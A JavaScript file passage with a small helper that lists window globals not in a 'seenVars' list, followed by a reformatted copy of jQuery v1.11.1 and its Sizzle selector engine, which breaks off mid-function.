function exploreEnhancedWindowObject() {
  const discoveries = {};
  const excludedProps = ['length', 'name', 'prototype'];
  Object.getOwnPropertyNames(window).forEach(prop => {
    if (!window.seenVars.includes(prop) && !excludedProps.includes(prop)) {
      try {
        const propValue = window[prop];
        discoveries[prop] = {
          type: typeof propValue,
          value: typeof propValue === "function" ? "Function" : propValue
        };
      } catch (error) {
        discoveries[prop] = {
          error: "Access Denied"
        };
      }
    }
  });
  return discoveries;
}
/*! jQuery v1.11.1 | (c) 2005, 2014 jQuery Foundation, Inc. | jquery.org/license */
!function (e, t) {
  "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function (e) {
    if (!e.document) throw new Error("jQuery requires a window with a document");
    return t(e);
  } : t(e);
}("undefined" != typeof window ? window : this, function (t, n) {
  var p = [],
    m = p.slice,
    Ce = p.concat,
    J = p.push,
    Ne = p.indexOf,
    q = {},
    Ut = q.toString,
    T = q.hasOwnProperty,
    r = {},
    Se = "1.11.1",
    e = function (t, n) {
      return new e.fn.init(t, n);
    },
    Gt = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
    Qt = /^-ms-/,
    Jt = /-([\da-z])/gi,
    Yt = function (e, t) {
      return t.toUpperCase();
    };
  e.fn = e.prototype = {
    jquery: Se,
    constructor: e,
    selector: "",
    length: 0,
    toArray: function () {
      return m.call(this);
    },
    get: function (e) {
      return null != e ? 0 > e ? this[e + this.length] : this[e] : m.call(this);
    },
    pushStack: function (t) {
      var n = e.merge(this.constructor(), t);
      return n.prevObject = this, n.context = this.context, n;
    },
    each: function (t, n) {
      return e.each(this, t, n);
    },
    map: function (t) {
      return this.pushStack(e.map(this, function (e, n) {
        return t.call(e, n, e);
      }));
    },
    slice: function () {
      return this.pushStack(m.apply(this, arguments));
    },
    first: function () {
      return this.eq(0);
    },
    last: function () {
      return this.eq(-1);
    },
    eq: function (e) {
      var n = this.length,
        t = +e + (0 > e ? n : 0);
      return this.pushStack(t >= 0 && n > t ? [this[t]] : []);
    },
    end: function () {
      return this.prevObject || this.constructor(null);
    },
    push: J,
    sort: p.sort,
    splice: p.splice
  }, e.extend = e.fn.extend = function () {
    var r,
      a,
      n,
      o,
      s,
      l,
      t = arguments[0] || {},
      i = 1,
      c = arguments.length,
      u = !1;
    for ("boolean" == typeof t && (u = t, t = arguments[i] || {}, i++), "object" == typeof t || e.isFunction(t) || (t = {}), i === c && (t = this, i--); c > i; i++) if (null != (s = arguments[i])) for (o in s) r = t[o], n = s[o], t !== n && (u && n && (e.isPlainObject(n) || (a = e.isArray(n))) ? (a ? (a = !1, l = r && e.isArray(r) ? r : []) : l = r && e.isPlainObject(r) ? r : {}, t[o] = e.extend(u, l, n)) : void 0 !== n && (t[o] = n));
    return t;
  }, e.extend({
    expando: "jQuery" + (Se + Math.random()).replace(/\D/g, ""),
    isReady: !0,
    error: function (e) {
      throw new Error(e);
    },
    noop: function () {},
    isFunction: function (t) {
      return "function" === e.type(t);
    },
    isArray: Array.isArray || function (t) {
      return "array" === e.type(t);
    },
    isWindow: function (e) {
      return null != e && e == e.window;
    },
    isNumeric: function (t) {
      return !e.isArray(t) && t - parseFloat(t) >= 0;
    },
    isEmptyObject: function (e) {
      var t;
      for (t in e) return !1;
      return !0;
    },
    isPlainObject: function (t) {
      var i;
      if (!t || "object" !== e.type(t) || t.nodeType || e.isWindow(t)) return !1;
      try {
        if (t.constructor && !T.call(t, "constructor") && !T.call(t.constructor.prototype, "isPrototypeOf")) return !1;
      } catch (n) {
        return !1;
      }
      ;
      if (r.ownLast) for (i in t) return T.call(t, i);
      for (i in t);
      return void 0 === i || T.call(t, i);
    },
    type: function (e) {
      return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? q[Ut.call(e)] || "object" : typeof e;
    },
    globalEval: function (n) {
      n && e.trim(n) && (t.execScript || function (e) {
        t.eval.call(t, e);
      })(n);
    },
    camelCase: function (e) {
      return e.replace(Qt, "ms-").replace(Jt, Yt);
    },
    nodeName: function (e, t) {
      return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
    },
    each: function (e, t, n) {
      var i,
        r = 0,
        o = e.length,
        a = ie(e);
      if (n) {
        if (a) {
          for (; o > r; r++) if (i = t.apply(e[r], n), i === !1) break;
        } else for (r in e) if (i = t.apply(e[r], n), i === !1) break;
      } else if (a) {
        for (; o > r; r++) if (i = t.call(e[r], r, e[r]), i === !1) break;
      } else for (r in e) if (i = t.call(e[r], r, e[r]), i === !1) break;
      return e;
    },
    trim: function (e) {
      return null == e ? "" : (e + "").replace(Gt, "");
    },
    makeArray: function (t, n) {
      var r = n || [];
      return null != t && (ie(Object(t)) ? e.merge(r, "string" == typeof t ? [t] : t) : J.call(r, t)), r;
    },
    inArray: function (e, t, n) {
      var r;
      if (t) {
        if (Ne) return Ne.call(t, e, n);
        for (r = t.length, n = n ? 0 > n ? Math.max(0, r + n) : n : 0; r > n; n++) if (n in t && t[n] === e) return n;
      }
      ;
      return -1;
    },
    merge: function (e, t) {
      var r = +t.length,
        n = 0,
        i = e.length;
      while (r > n) e[i++] = t[n++];
      if (r !== r) while (void 0 !== t[n]) e[i++] = t[n++];
      return e.length = i, e;
    },
    grep: function (e, t, n) {
      for (var i, o = [], r = 0, a = e.length, s = !n; a > r; r++) i = !t(e[r], r), i !== s && o.push(e[r]);
      return o;
    },
    map: function (e, t, n) {
      var i,
        r = 0,
        a = e.length,
        s = ie(e),
        o = [];
      if (s) for (; a > r; r++) i = t(e[r], r, n), null != i && o.push(i);else for (r in e) i = t(e[r], r, n), null != i && o.push(i);
      return Ce.apply([], o);
    },
    guid: 1,
    proxy: function (t, n) {
      var i, r, o;
      return "string" == typeof n && (o = t[n], n = t, t = o), e.isFunction(t) ? (i = m.call(arguments, 2), r = function () {
        return t.apply(n || this, i.concat(m.call(arguments)));
      }, r.guid = t.guid = t.guid || e.guid++, r) : void 0;
    },
    now: function () {
      return +new Date();
    },
    support: r
  }), e.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function (e, t) {
    q["[object " + t + "]"] = t.toLowerCase();
  });
  function ie(t) {
    var n = t.length,
      r = e.type(t);
    return "function" === r || e.isWindow(t) ? !1 : 1 === t.nodeType && n ? !0 : "array" === r || 0 === n || "number" == typeof n && n > 0 && n - 1 in t;
  }
  ;
  var N = function (e) {
    var E,
      i,
      t,
      B,
      le,
      j,
      Q,
      oe,
      M,
      b,
      k,
      y,
      s,
      h,
      f,
      l,
      C,
      O,
      D,
      a = "sizzle" + -new Date(),
      c = e.document,
      p = 0,
      xe = 0,
      se = U(),
      K = U(),
      Z = U(),
      J = function (e, t) {
        return e === t && (k = !0), 0;
      },
      S = "undefined",
      ae = 1 << 31,
      Ee = {}.hasOwnProperty,
      v = [],
      de = v.pop,
      ce = v.push,
      x = v.push,
      ie = v.slice,
      w = v.indexOf || function (e) {
        for (var t = 0, n = this.length; n > t; t++) if (this[t] === e) return t;
        return -1;
      },
      G = "checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",
      n = "[\\x20\\t\\r\\n\\f]",
      N = "(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",
      ne = N.replace("w", "w#"),
      re = "\\[" + n + "*(" + N + ")(?:" + n + "*([*^$|!~]?=)" + n + "*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|(" + ne + "))|)" + n + "*\\]",
      Y = ":(" + N + ")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|" + re + ")*)|.*)\\)|)",
      F = new RegExp("^" + n + "+|((?:^|[^\\\\])(?:\\\\.)*)" + n + "+$", "g"),
      ve = new RegExp("^" + n + "*," + n + "*"),
      ye = new RegExp("^" + n + "*([>+~]|" + n + ")" + n + "*"),
      Ne = new RegExp("=" + n + "*([^\\]'\"]*?)" + n + "*\\]", "g"),
      pe = new RegExp(Y),
      ge = new RegExp("^" + ne + "$"),
      L = {
        ID: new RegExp("^#(" + N + ")"),
        CLASS: new RegExp("^\\.(" + N + ")"),
        TAG: new RegExp("^(" + N.replace("w", "w*") + ")"),
        ATTR: new RegExp("^" + re),
        PSEUDO: new RegExp("^" + Y),
        CHILD: new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\(" + n + "*(even|odd|(([+-]|)(\\d*)n|)" + n + "*(?:([+-]|)" + n + "*(\\d+)|))" + n + "*\\)|)", "i"),
        bool: new RegExp("^(?:" + G + ")$", "i"),
        needsContext: new RegExp("^" + n + "*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\(" + n + "*((?:-\\d)?\\d*)" + n + "*\\)|)(?=[^-]|$)", "i")
      },
      Ce = /^(?:input|select|textarea|button)$/i,
      Te = /^h\d$/i,
      A = /^[^{]+\{\s*\[native \w/,
      we = /^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,
      P = /[+~]/,
      be = /'|\\/g,
      g = new RegExp("\\\\([\\da-f]{1,6}" + n + "?|(" + n + ")|.)", "ig"),
      m = function (e, t, n) {
        var r = "0x" + t - 65536;
        return r !== r || n ? t : 0 > r ? String.fromCharCode(r + 65536) : String.fromCharCode(r >> 10 | 55296, 1023 & r | 56320);
      };
    try {
      x.apply(v = ie.call(c.childNodes), c.childNodes), v[c.childNodes.length].nodeType;
    } catch (o) {
      x = {
        apply: v.length ? function (e, t) {
          ce.apply(e, ie.call(t));
        } : function (e, t) {
          var n = e.length,
            r = 0;
          while (e[n++] = t[r++]);
          e.length = n - 1;
        }
      };
    }
    ;
    function r(e, t, n, r) {
      var g, u, d, h, v, m, b, p, T, w;
      if ((t ? t.ownerDocument || t : c) !== s && y(t), t = t || s, n = n || [], !e || "string" != typeof e) return n;
      if (1 !== (h = t.nodeType) && 9 !== h) return [];
      if (f && !r) {
        if (g = we.exec(e)) if (d = g[1]) {
          if (9 === h) {
            if (u = t.getElementById(d), !u || !u.parentNode) return n;
            if (u.id === d) return n.push(u), n;
          } else if (t.ownerDocument && (u = t.ownerDocument.getElementById(d)) && D(t, u) && u.id === d) return n.push(u), n;
        } else {
          if (g[2]) return x.apply(n, t.getElementsByTagName(e)), n;
          if ((d = g[3]) && i.getElementsByClassName && t.getElementsByClassName) return x.apply(n, t.getElementsByClassName(d)), n;
        }
        ;
        if (i.qsa && (!l || !l.test(e))) {
          if (p = b = a, T = t, w = 9 === h && e, 1 === h && "object" !== t.nodeName.toLowerCase()) {
            m = j(e), (b = t.getAttribute("id")) ? p = b.replace(be, "\\$&") : t.setAttribute("id", p), p = "[id='" + p + "'] ", v = m.length;
            while (v--) m[v] = p + q(m[v]);
            T = P.test(e) && X(t.parentNode) || t, w = m.join(",");
          }
          ;
          if (w) try {
            return x.apply(n, T.querySelectorAll(w)), n;
          } catch (o) {} finally {
            b || t.removeAttribute("id");
          }
        }
      }
      ;
      return oe(e.replace(F, "$1"), t, n, r);
    }
    ;
    function U() {
      var n = [];
      function e(r, i) {
        return n.push(r + " ") > t.cacheLength && delete e[n.shift()], e[r + " "] = i;
      }
      ;
      return e;
    }
    ;
    function d(e) {
      return e[a] = !0, e;
    }
    ;
    function u(e) {
      var n = s.createElement("div");
      try {
        return !!e(n);
      } catch (t) {
        return !1;
      } finally {
        n.parentNode && n.parentNode.removeChild(n), n = null;
      }
    }
    ;
    function V(e, n) {
      var i = e.split("|"),
        r = e.length;
      while (r--) t.attrHandle[i[r]] = n;
    }
    ;
    function ee(e, t) {
      var n = t && e,
        r = n && 1 === e.nodeType && 1 === t.nodeType && (~t.sourceIndex || ae) - (~e.sourceIndex || ae);
      if (r) return r;
      if (n) while (n = n.nextSibling) if (n === t) return -1;
      return e ? 1 : -1;
    }
    ;
    function me(e) {
      return function (t) {
        var n = t.nodeName.toLowerCase();
        return "input" === n && t.type === e;
      };
    }
    ;
    function he(e) {
      return function (t) {
        var n = t.nodeName.toLowerCase();
        return ("input" === n || "button" === n) && t.type === e;
      };
    }
    ;
    function T(e) {
      return d(function (t) {
        return t = +t, d(function (n, r) {
          var i,
            o = e([], n.length, t),
            a = o.length;
          while (a--) n[i = o[a]] && (n[i] = !(r[i] = n[i]));
        });
      });
    }
    ;
    function X(e) {
      return e && typeof e.getElementsByTagName !== S && e;
    }
    ;
    i = r.support = {}, le = r.isXML = function (e) {
      var t = e && (e.ownerDocument || e).documentElement;
      return t ? "HTML" !== t.nodeName : !1;
    }, y = r.setDocument = function (e) {
      var d,
        r = e ? e.ownerDocument || e : c,
        o = r.defaultView;
      return r !== s && 9 === r.nodeType && r.documentElement ? (s = r, h = r.documentElement, f = !le(r), o && o !== o.top && (o.addEventListener ? o.addEventListener("unload", function () {
        y();
      }, !1) : o.attachEvent && o.attachEvent("onunload", function () {
        y();
      })), i.attributes = u(function (e) {
        return e.className = "i", !e.getAttribute("className");
      }), i.getElementsByTagName = u(function (e) {
        return e.appendChild(r.createComment("")), !e.getElementsByTagName("*").length;
      }), i.getElementsByClassName = A.test(r.getElementsByClassName) && u(function (e) {
        return e.innerHTML = "<div class='a'></div><div class='a i'></div>", e.firstChild.className = "i", 2 === e.getElementsByClassName("i").length;
      }), i.getById = u(function (e) {
        return h.appendChild(e).id = a, !r.getElementsByName || !r.getElementsByName(a).length;
      }), i.getById ? (t.find.ID = function (e, t) {
        if (typeof t.getElementById !== S && f) {
          var n = t.getElementById(e);
          return n && n.parentNode ? [n] : [];
        }
      }, t.filter.ID = function (e) {
        var t = e.replace(g, m);
        return function (e) {
          return e.getAttribute("id") === t;
        };
      }) : (delete t.find.ID, t.filter.ID = function (e) {
        var t = e.replace(g, m);
        return function (e) {
          var n = typeof e.getAttributeNode !== S && e.getAttributeNode("id");
          return n && n.value === t;
        };
      }), t.find.TAG = i.getElementsByTagName ? function (e, t) {
        return typeof t.getElementsByTagName !== S ? t.getElementsByTagName(e) : void 0;
      } : function (e, t) {
        var n,
          r = [],
          o = 0,
          i = t.getElementsByTagName(e);
        if ("*" === e) {
          while (n = i[o++]) 1 === n.nodeType && r.push(n);
          return r;
        }
        ;
        return i;
      }, t.find.CLASS = i.getElementsByClassName && function (e, t) {
        return typeof t.getElementsByClassName !== S && f ? t.getElementsByClassName(e) : void 0;
      }, C = [], l = [], (i.qsa = A.test(r.querySelectorAll)) && (u(function (e) {
        e.innerHTML = "<select msallowclip=''><option selected=''></option></select>", e.querySelectorAll("[msallowclip^='']").length && l.push("[*^$]=" + n + "*(?:''|\"\")"), e.querySelectorAll("[selected]").length || l.push("\\[" + n + "*(?:value|" + G + ")"), e.querySelectorAll(":checked").length || l.push(":checked");
      }), u(function (e) {
        var t = r.createElement("input");
        t.setAttribute("type", "hidden"), e.appendChild(t).setAttribute("name", "D"), e.querySelectorAll("[name=d]").length && l.push("name" + n + "*[*^$|!~]?="), e.querySelectorAll(":enabled").length || l.push(":enabled", ":disabled"), e.querySelectorAll("*,:x"), l.push(",.*:");
      })), (i.matchesSelector = A.test(O = h.matches || h.webkitMatchesSelector || h.mozMatchesSelector || h.oMatchesSelector || h.msMatchesSelector)) && u(function (e) {
        i.disconnectedMatch = O.call(e, "div"), O.call(e, "[s!='']:x"), C.push("!=", Y);
      }), l = l.length && new RegExp(l.join("|")), C = C.length && new RegExp(C.join("|")), d = A.test(h.compareDocumentPosition), D = d || A.test(h.contains) ? function (e, t) {
        var r = 9 === e.nodeType ? e.documentElement : e,
          n = t && t.parentNode;
        return e === n || !(!n || 1 !== n.nodeType || !(r.contains ? r.contains(n) : e.compareDocumentPosition && 16 & e.compareDocumentPosition(n)));
      } : function (e, t) {
        if (t) while (t = t.parentNode) if (t === e) return !0;
        return !1;
      }, J = d ? function (e, t) {
        if (e === t) return k = !0, 0;
        var n = !e.compareDocumentPosition - !t.compareDocumentPosition;
        return n ? n : (n = (e.ownerDocument || e) === (t.ownerDocument || t) ? e.compareDocumentPosition(t) : 1, 1 & n || !i.sortDetached && t.compareDocumentPosition(e) === n ? e === r || e.ownerDocument === c && D(c, e) ? -1 : t === r || t.ownerDocument === c && D(c, t) ? 1 : b ? w.call(b, e) - w.call(b, t) : 0 : 4 & n ? -1 : 1);
      } : function (e, t) {
        if (e === t) return k = !0, 0;
        var n,
          i = 0,
          s = e.parentNode,
          l = t.parentNode,
          o = [e],
          a = [t];
        if (!s || !l) return e === r ? -1 : t === r ? 1 : s ? -1 : l ? 1 : b ? w.call(b, e) - w.call(b, t) : 0;
        if (s === l) return ee(e, t);
        n = e;
        while (n = n.parentNode) o.unshift(n);
        n = t;
        while (n = n.parentNode) a.unshift(n);
        while (o[i] === a[i]) i++;
        return i ? ee(o[i], a[i]) : o[i] === c ? -1 : a[i] === c ? 1 : 0;
      }, r) : s;
    }, r.matches = function (e, t) {
      return r(e, null, null, t);
    }, r.matchesSelector = function (e, t) {
      if ((e.ownerDocument || e) !== s && y(e), t = t.replace(Ne, "='$1']"), !(!i.matchesSelector || !f || C && C.test(t) || l && l.test(t))) try {
        var o = O.call(e, t);
        if (o || i.disconnectedMatch || e.document && 11 !== e.document.nodeType) return o;
      } catch (n) {}
      ;
      return r(t, s, null, [e]).length > 0;
    }, r.contains = function (e, t) {
      return (e.ownerDocument || e) !== s && y(e), D(e, t);
    }, r.attr = function (e, n) {
      (e.ownerDocument || e) !== s && y(e);
      var o = t.attrHandle[n.toLowerCase()],
        r = o && Ee.call(t.attrHandle, n.toLowerCase()) ? o(e, n, !f) : void 0;
      return void 0 !== r ? r : i.attributes || !f ? e.getAttribute(n) : (r = e.getAttributeNode(n)) && r.specified ? r.value : null;
    }, r.error = function (e) {
      throw new Error("Syntax error, unrecognized expression: " + e);
    }, r.uniqueSort = function (e) {
      var r,
        o = [],
        t = 0,
        n = 0;
      if (k = !i.detectDuplicates, b = !i.sortStable && e.slice(0), e.sort(J), k) {
        while (r = e[n++]) r === e[n] && (t = o.push(n));
        while (t--) e.splice(o[t], 1);
      }
      ;
      return b = null, e;
    }, B = r.getText = function (e) {
      var r,
        n = "",
        i = 0,
        t = e.nodeType;
      if (t) {
        if (1 === t || 9 === t || 11 === t) {
          if ("string" == typeof e.textContent) return e.textContent;
          for (e = e.firstChild; e; e = e.nextSibling) n += B(e);
        } else if (3 === t || 4 === t) return e.nodeValue;
      } else while (r = e[i++]) n += B(r);
      return n;
    }, t = r.selectors = {
      cacheLength: 50,
      createPseudo: d,
      match: L,
      attrHandle: {},
      find: {},
      relative: {
        ">": {
          dir: "parentNode",
          first: !0
        },
        " ": {
          dir: "parentNode"
        },
        "+": {
          dir: "previousSibling",
          first: !0
        },
        "~": {
          dir: "previousSibling"
        }
      },
      preFilter: {
        ATTR: function (e) {
          return e[1] = e[1].replace(g, m), e[3] = (e[3] || e[4] || e[5] || "").replace(g, m), "~=" === e[2] && (e[3] = " " + e[3] + " "), e.slice(0, 4);
        },
        CHILD: function (e) {
          return e[1] = e[1].toLowerCase(), "nth" === e[1].slice(0, 3) ? (e[3] || r.error(e[0]), e[4] = +(e[4] ? e[5] + (e[6] || 1) : 2 * ("even" === e[3] || "odd" === e[3])), e[5] = +(e[7] + e[8] || "odd" === e[3])) : e[3] && r.error(e[0]), e;
        },
        PSEUDO: function (e) {
          var n,
            t = !e[6] && e[2];
          return L.CHILD.test(e[0]) ? null : (e[3] ? e[2] = e[4] || e[5] || "" : t && pe.test(t) && (n = j(t, !0)) && (n = t.indexOf(")", t.length - n) - t.length) && (e[0] = e[0].slice(0, n), e[2] = t.slice(0, n)), e.slice(0, 3));
        }
      },
      filter: {
        TAG: function (e) {
          var t = e.replace(g, m).toLowerCase();
          return "*" === e ? function () {
            return !0;
          } : function (e) {
            return e.nodeName && e.nodeName.toLowerCase() === t;
          };
        },
        CLASS: function (e) {
          var t = se[e + " "];
          return t || (t = new RegExp("(^|" + n + ")" + e + "(" + n + "|$)")) && se(e, function (e) {
            return t.test("string" == typeof e.className && e.className || typeof e.getAttribute !== S && e.getAttribute("class") || "");
          });
        },
        ATTR: function (e, t, n) {
          return function (i) {
            var o = r.attr(i, e);
            return null == o ? "!=" === t : t ? (o += "", "=" === t ? o === n : "!=" === t ? o !== n : "^=" === t ? n && 0 === o.indexOf(n) : "*=" === t ? n && o.indexOf(n) > -1 : "$=" === t ? n && o.slice(-n.length) === n : "~=" === t ? (" " + o + " ").indexOf(n) > -1 : "|=" === t ? o === n || o.slice(0, n.length + 1) === n + "-" : !1) : !0;
          };
        },
        CHILD: function (e, t, n, r, i) {
          var l = "nth" !== e.slice(0, 3),
            s = "last" !== e.slice(-4),
            o = "of-type" === t;
          return 1 === r && 0 === i ? function (e) {
            return !!e.parentNode;
          } : function (t, n, u) {
            var f,
              y,
              c,
              d,
              h,
              g,
              v = l !== s ? "nextSibling" : "previousSibling",
              m = t.parentNode,
              b = o && t.nodeName.toLowerCase(),
              x = !u && !o;
            if (m) {
              if (l) {
                while (v) {
                  c = t;
                  while (c = c[v]) if (o ? c.nodeName.toLowerCase() === b : 1 === c.nodeType) return !1;
                  g = v = "only" === e && !g && "nextSibling";
                }
                ;
                return !0;
              }
              ;
              if (g = [s ? m.firstChild : m.lastChild], s && x) {
                y = m[a] || (m[a] = {}), f = y[e] || [], h = f[0] === p && f[1], d = f[0] === p && f[2], c = h && m.childNodes[h];
                while (c = ++h && c && c[v] || (d = h = 0) || g.pop()) if (1 === c.nodeType && ++d && c === t) {
                  y[e] = [p, h, d];
                  break;
                }
              } else if (x && (f = (t[a] || (t[a] = {}))[e]) && f[0] === p) d = f[1];else while (c = ++h && c && c[v] || (d = h = 0) || g.pop()) if ((o ? c.nodeName.toLowerCase() === b : 1 === c.nodeType) && ++d && (x && ((c[a] || (c[a] = {}))[e] = [p, d]), c === t)) break;
              return d -= i, d === r || d % r === 0 && d / r >= 0;
            }
          };
        },
        PSEUDO: function (e, n) {
          var o,
            i = t.pseudos[e] || t.setFilters[e.toLowerCase()] || r.error("unsupported pseudo: " + e);
          return i[a] ? i(n) : i.length > 1 ? (o = [e, e, "", n], t.setFilters.hasOwnProperty(e.toLowerCase()) ? d(function (e, t) {
            var r,
              o = i(e, n),
              a = o.length;
            while (a--) r = w.call(e, o[a]), e[r] = !(t[r] = o[a]);
          }) : function (e) {
            return i(e, 0, o);
          }) : i;
        }
      },
      pseudos: {
        not: d(function (e) {
          var n = [],
            r = [],
            t = Q(e.replace(F, "$1"));
          return t[a] ? d(function (e, n, r, i) {
            var a,
              s = t(e, null, i, []),
              o = e.length;
            while (o--) (a = s[o]) && (e[o] = !(n[o] = a));
          }) : function (e, i, o) {
            return n[0] = e, t(n, null, o, r), !r.pop();
          };
        }),
        has: d(function (e) {
          return function (t) {
            return r(e, t).length > 0;
          };
        }),
        contains: d(function (e) {
          return function (t) {
            return (t.textContent || t.innerText || B(t)).indexOf(e) > -1;
          };
        }),
        lang: d(function (e) {
          return ge.test(e || "") || r.error("unsupported lang: " + e), e = e.replace(g, m).toLowerCase(), function (t) {
            var n;
            do if (n = f ? t.lang : t.getAttribute("xml:lang") || t.getAttribute("lang")) return n = n.toLowerCase(), n === e || 0 === n.indexOf(e + "-"); while ((t = t.parentNode) && 1 === t.nodeType);
            return !1;
          };
        }),
        target: function (t) {
          var n = e.location && e.location.hash;
          return n && n.slice(1) === t.id;
        },
        root: function (e) {
          return e === h;
        },
        focus: function (e) {
          return e === s.activeElement && (!s.hasFocus || s.hasFocus()) && !!(e.type || e.href || ~e.tabIndex);
        },
        enabled: function (e) {
          return e.disabled === !1;
        },
        disabled: function (e) {
          return e.disabled === !0;
        },
        checked: function (e) {
          var t = e.nodeName.toLowerCase();
          return "input" === t && !!e.checked || "option" === t && !!e.selected;
        },
        selected: function (e) {
          return e.parentNode && e.parentNode.selectedIndex, e.selected === !0;
        },
        empty: function (e) {
          for (e = e.firstChild; e; e = e.nextSibling) if (e.nodeType < 6) return !1;
          return !0;
        },
        parent: function (e) {
          return !t.pseudos.empty(e);
        },
        header: function (e) {
          return Te.test(e.nodeName);
        },
        input: function (e) {
          return Ce.test(e.nodeName);
        },
        button: function (e) {
          var t = e.nodeName.toLowerCase();
          return "input" === t && "button" === e.type || "button" === t;
        },
        text: function (e) {
          var t;
          return "input" === e.nodeName.toLowerCase() && "text" === e.type && (null == (t = e.getAttribute("type")) || "text" === t.toLowerCase());
        },
        first: T(function () {
          return [0];
        }),
        last: T(function (e, t) {
          return [t - 1];
        }),
        eq: T(function (e, t, n) {
          return [0 > n ? n + t : n];
        }),
        even: T(function (e, t) {
          for (var n = 0; t > n; n += 2) e.push(n);
          return e;
        }),
        odd: T(function (e, t) {
          for (var n = 1; t > n; n += 2) e.push(n);
          return e;
        }),
        lt: T(function (e, t, n) {
          for (var r = 0 > n ? n + t : n; --r >= 0;) e.push(r);
          return e;
        }),
        gt: T(function (e, t, n) {
          for (var r = 0 > n ? n + t : n; ++r < t;) e.push(r);
          return e;
        })
      }
    }, t.pseudos.nth = t.pseudos.eq;
    for (E in {
      radio: !0,
      checkbox: !0,
      file: !0,
      password: !0,
      image: !0
    }) t.pseudos[E] = me(E);
    for (E in {
      submit: !0,
      reset: !0
    }) t.pseudos[E] = he(E);
    function te() {}
    ;
    te.prototype = t.filters = t.pseudos, t.setFilters = new te(), j = r.tokenize = function (e, n) {
      var a,
        o,
        l,
        s,
        i,
        u,
        c,
        d = K[e + " "];
      if (d) return n ? 0 : d.slice(0);
      i = e, u = [], c = t.preFilter;
      while (i) {
        (!a || (o = ve.exec(i))) && (o && (i = i.slice(o[0].length) || i), u.push(l = [])), a = !1, (o = ye.exec(i)) && (a = o.shift(), l.push({
          value: a,
          type: o[0].replace(F, " ")
        }), i = i.slice(a.length));
        for (s in t.filter) !(o = L[s].exec(i)) || c[s] && !(o = c[s](o)) || (a = o.shift(), l.push({
          value: a,
          type: s,
          matches: o
        }), i = i.slice(a.length));
        if (!a) break;
      }
      ;
      return n ? i.length : i ? r.error(e) : K(e, u).slice(0);
    };
    function q(e) {
      for (var t = 0, r = e.length, n = ""; r > t; t++) n += e[t].value;
      return n;
    }
    ;
    function I(e, t, n) {
      var r = t.dir,
        i = n && "parentNode" === r,
        o = xe++;
      return t.first ? function (t, n, o) {
        while (t = t[r]) if (1 === t.nodeType || i) return e(t, n, o);
      } : function (t, n, s) {
        var l,
          u,
          c = [p, o];
        if (s) {
          while (t = t[r]) if ((1 === t.nodeType || i) && e(t, n, s)) return !0;
        } else while (t = t[r]) if (1 === t.nodeType || i) {
          if (u = t[a] || (t[a] = {}), (l = u[r]) && l[0] === p && l[1] === o) return c[2] = l[2];
          if (u[r] = c, c[2] = e(t, n, s)) return !0;
        }
      };
    }
    ;
    function z(e) {
      return e.length > 1 ? function (t, n, r) {
        var i = e.length;
        while (i--) if (!e[i](t, n, r)) return !1;
        return !0;
      } : e[0];
    }
    ;
    function ue(e, t, n) {
      for (var i = 0, o = t.length; o > i; i++) r(e, t[i], n);
      return n;
    }
    ;
    function H(e, t, n, r, i) {
      for (var a, s = [], o = 0, l = e.length, u = null != t; l > o; o++) (a = e[o]) && (!n || n(a, r, i)) && (s.push(a), u && t.push(o));
      return s;
    }
    ;
    function W(e, t, n, r, i, o) {
      return r && !r[a] && (r = W(r)), i && !i[a] && (i = W(i, o)), d(function (o, a, s, l) {
        var d,
          c,
          f,
          m = [],
          h = [],
          g = a.length,
          v = o || ue(t || "*", s.nodeType ? [s] : s, []),
          p = !e || !o && t ? v : H(v, m, e, s, l),
          u = n ? i || (o ? e : g || r) ? [] : a : p;
        if (n && n(p, u, s, l), r) {
          d = H(u, h), r(d, [], s, l), c = d.length;
          while (c--) (f = d[c]) && (u[h[c]] = !(p[h[c]] = f));
        }
        ;
        if (o) {
          if (i || e) {
            if (i) {
              d = [], c = u.length;
              while (c--) (f = u[c]) && d.push(p[c] = f);
              i(null, u = [], d, l);
            }
            ;
            c = u.length;
            while (c--) (f = u[c]) && (d = i ? w.call(o, f) : m[c]) > -1 && (o[d] = !(a[d] = f));
          }
        } else u = H(u === a ? u.splice(g, u.length) : u), i ? i(null, a, u, l) : x.apply(a, u);
      });
    }
    ;
    function R(e) {
      for (var l, i, r, s = e.length, u = t.relative[e[0].type], c = u || t.relative[" "], n = u ? 1 : 0, d = I(function (e) {
          return e === l;
        }, c, !0), f = I(function (e) {
          return w.call(l, e) > -1;
        }, c, !0), o = [function (e, t, n) {
          return !u && (n || t !== M) || ((l = t).nodeType ? d(e, t, n) : f(e, t, n));
        }]; s > n; n++) if (i = t.relative[e[n].type]) o = [I(z(o), i)];else {
        if (i = t.filter[e[n].type].apply(null, e[n].matches), i[a]) {
          for (r = ++n; s > r; r++) if (t.relative[e[r].type]) break;
          return W(n > 1 && z(o), n > 1 && q(e.slice(0, n - 1).concat({
            value: " " === e[n - 2].type ? "*" : ""
          })).replace(F, "$1"), i, r > n && R(e.slice(n, r)), s > r && R(e = e.slice(r)), s > r && q(e));
        }
        ;
        o.push(i);
      }
      ;
      return z(o);
    }
    ;
    function fe(e, n) {
      var i = n.length > 0,
        o = e.length > 0,
        a = function (a, l, u, c, d) {
          var h,
            y,
            g,
            v = 0,
            f = "0",
            b = a && [],
            m = [],
            w = M,
            T = a || o && t.find.TAG("*", d),
            C = p += null == w ? 1 : Math.random() || .1,
            N = T.length;
          for (d && (M = l !== s && l); f !== N && null != (h = T[f]); f++) {
            if (o && h) {
              y = 0;
              while (g = e[y++]) if (g(h, l, u)) {
                c.push(h);
                break;
              }
              ;
              d && (p = C);
            }
            ;
            i && ((h = !g && h) && v--, a && b.push(h));
          }
          ;
          if (v += f, i && f !== v) {
            y = 0;
            while (g = n[y++]) g(b, m, l, u);
            if (a) {
              if (v > 0) while (f--) b[f] || m[f] || (m[f] = de.call(c));
              m = H(m);
            }
